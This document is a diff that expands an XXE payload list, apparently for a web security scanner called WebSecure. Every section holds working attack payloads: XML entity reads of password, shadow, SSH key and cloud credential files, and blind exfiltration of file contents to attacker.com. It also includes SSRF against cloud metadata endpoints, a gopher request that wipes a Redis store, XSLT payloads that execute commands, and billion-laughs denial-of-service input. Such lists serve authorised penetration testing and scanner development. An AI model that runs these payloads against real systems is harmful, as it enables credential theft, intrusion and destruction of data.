@@ -1,5 +1,5 @@
 # XXE Payloads — WebSecure
-# Basic | CDATA | Blind-OOB | SSRF | SVG | SOAP | Parameter-Entity | XInclude
+# Basic | CDATA | Blind-OOB | SSRF | SVG | SOAP | XInclude | Error-Based | Java | .NET | XSLT | Upload | Protocol
 
 # ── BASIC FILE READ (Linux) ──
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
@@ -12,12 +12,26 @@
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/net/arp">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/net/tcp">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/status">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/maps">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/1/cmdline">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/.env">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/www/.env">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.bash_history">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.aws/credentials">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.docker/config.json">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/ssh/sshd_config">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/crontab">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/sudoers">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/mysql/my.cnf">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/nginx/access.log">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///run/secrets/kubernetes.io/serviceaccount/token">]><foo>&xxe;</foo>
 
 # ── BASIC FILE READ (Windows) ──
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>
@@ -26,15 +40,22 @@
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/SAM">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Users/Administrator/.ssh/id_rsa">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/repair/SAM">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/xampp/htdocs/.env">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/php.ini">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/inetsrv/config/applicationHost.config">]><foo>&xxe;</foo>
 
 # ── PHP WRAPPER ──
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=/etc/passwd">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/zlib.deflate|convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">]><foo>&xxe;</foo>
 
 # ── BLIND / OOB (DTD tabanlı) ──
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo>test</foo>
@@ -42,6 +63,15 @@
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]><foo>test</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://attacker.com:21/xxe">%xxe;]><foo>test</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe "<!ENTITY all SYSTEM 'http://attacker.com/?x=%file;'>">%xxe;]><foo>&all;</foo>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%init;%trick;]>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p1 SYSTEM "http://attacker.com/a">%p1;]><r/>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY % b "<!ENTITY c SYSTEM 'http://attacker.com/?x=%a;'>">%b;]><r>&c;</r>
+
+# ── ERROR-BASED XXE DATA EXFILTRATION ──
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">%eval;%exfil;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/shadow"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;]><foo/>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [<!ENTITY % p SYSTEM "file:///etc/passwd"><!ENTITY % q "<!ENTITY s SYSTEM 'http://attacker.com/?e=%p;'>">%q;]><r>&s;</r>
+<?xml version="1.0"?><!DOCTYPE message [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'gopher://attacker.com:1234/_%file;'>">%wrapper;%send;]><message>test</message>
 
 # ── SSRF VIA XXE ──
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
@@ -52,34 +82,113 @@
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/server-status">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://kubernetes.default.svc/api/v1/secrets/">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://100.100.100.200/latest/meta-data/">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://127.0.0.1:6379/info">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A">]><foo>&xxe;</foo>
 
-# ── CDATA BYPASS (parser'ı kandırmak için) ──
+# ── CDATA BYPASS ──
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> <!ENTITY wrapper "<![CDATA[" > "%wrapped;" "<![CDATA[]]>" "]]>" >]><foo>&xxe;</foo>
 <![CDATA[<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>]]>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA["> <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % end "]]>"> <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]><foo>&data;</foo>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'file:///etc/passwd'>">%a;%b;]><r/>
 
 # ── SVG XXE ──
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>
 <?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
 <svg xmlns="http://www.w3.org/2000/svg"><script href="http://attacker.com/xss.js"/></svg>
+<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://attacker.com/evil.dtd"><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
 
 # ── SOAP XXE ──
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://example.com"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soapenv:Body><web:test>&xxe;</web:test></soapenv:Body></soapenv:Envelope>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><soapenv:Body><soapenv:Fault><faultcode>&exfil;</faultcode></soapenv:Fault></soapenv:Body></soapenv:Envelope>
 
 # ── XINCLUDE ──
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///C:/Windows/win.ini"/></foo>
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://attacker.com/evil.xml"/></foo>
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/></foo>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/shadow"/></foo>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///root/.ssh/id_rsa"/></foo>
+<root><xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/></root>
 
 # ── PARAMETER ENTITY ──
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a "<!ENTITY b 'test'>"> %a;]><foo>&b;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>"> %eval; %exfil;]><foo>test</foo>
 <?xml version="1.0"?><!DOCTYPE test [<!ENTITY % one SYSTEM "http://attacker.com/evil.dtd">%one;%two;%three;]><test/>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.com/a.dtd">%p;]><r>&x;</r>
 
-# ── DENIAL OF SERVICE (Billion Laughs) ──
-<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>
+# ── JAVA XXE (SAXParser / DocumentBuilder / XMLReader) ──
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><bar>&xxe;</bar>
+<?xml version="1.0"?><!DOCTYPE bar [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/evil.xml">]><bar>&xxe;</bar>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%int;%trick;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "classpath:/META-INF/persistence.xml">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///C:/path/to/application.jar!/WEB-INF/web.xml">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
 
-# ── NETDOC / UNC ──
+# ── .NET XXE (XmlReader / XmlDocument / XPathDocument) ──
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE configuration [<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">]><configuration>&xxe;</configuration>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/netdata">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "\\\\attacker.com\\xxe">]><foo>&xxe;</foo>
+
+# ── XSLT INJECTION ──
+<?xml version="1.0"?><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template match="/"><xsl:value-of select="document('file:///etc/passwd')"/></xsl:template></xsl:stylesheet>
+<?xml version="1.0"?><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template match="/"><xsl:value-of select="document('http://attacker.com/evil.xml')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"><xsl:template match="/"><xsl:variable name="rtObj" select="rt:getRuntime()"/><xsl:variable name="process" select="rt:exec($rtObj,'id')"/><xsl:value-of select="ob:toString($process)"/></xsl:template></xsl:stylesheet>
+<?xml version="1.0"?><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0"><xsl:template match="/"><xsl:value-of select="php:function('shell_exec','id')"/></xsl:template></xsl:stylesheet>
+
+# ── XXE VIA FILE UPLOAD (SVG/DOCX/XLSX/ODT) ──
+<?xml version="1.0" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" height="1" width="1"><text y="1">&xxe;</text></svg>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="Sheet1" sheetId="1"/></sheets></workbook>
+
+# ── PROTOCOL ABUSE ──
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com:21/data">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "sftp://attacker.com/data">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ldap://attacker.com/data">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "\\attacker.com\xxe">]><foo>&xxe;</foo>
+
+# ── DENIAL OF SERVICE (Billion Laughs + Variants) ──
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>
+<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><bomb>&c;</bomb>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY dos SYSTEM "file:///dev/random">]><r>&dos;</r>
+
+# ── ENCODING BYPASS ──
+<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI->+AF0->+ADw-foo>+ACY-xxe+ADs-+ADw-/foo>
+<?xml version="1.0" encoding="UTF-16"?>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "FILE:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///ETC/PASSWD">]><foo>&xxe;</foo>
+
+# ── XML WITH ENTITY IN DIFFERENT LOCATIONS ──
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo attr="&xxe;">test</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY f SYSTEM "file:///etc/passwd">]><r a="&f;"/>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY f SYSTEM "file:///etc/passwd">]><!-- &f; --><r/>
+
+# ── SCHEMA-BASED XXE (XML Schema / DTD) ──
+<?xml version="1.0"?><!DOCTYPE schema [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">&xxe;</xs:schema>
+<?xml version="1.0"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://attacker.com/evil.dtd"><html>&xxe;</html>
+
+# ── BLIND XXE VIA ERROR MESSAGES ──
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">%eval;%err;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///%file;'>">%eval;%err;]><foo/>
+
+# ── XXE IN JSON API (Content-Type swap) ──
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r><item>&x;</item></r>
+
+# ── RECURSIVE / NESTED ENTITY ──
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "A"><!ENTITY b "&a;B"><!ENTITY c "&b;C">]><r>&c;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p "<!ENTITY q 'test'>">%p;]><r>&q;</r>
+
+# ── OOB VIA GOPHER ──
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/_HELO%20attacker%0D%0A">]><r>&xxe;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A">]><r>&xxe;</r>
+
+# ── DETECTION PROBES (benign) ──
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "xxe_test">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe_probe">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe_probe_param">%xxe;]><foo/>
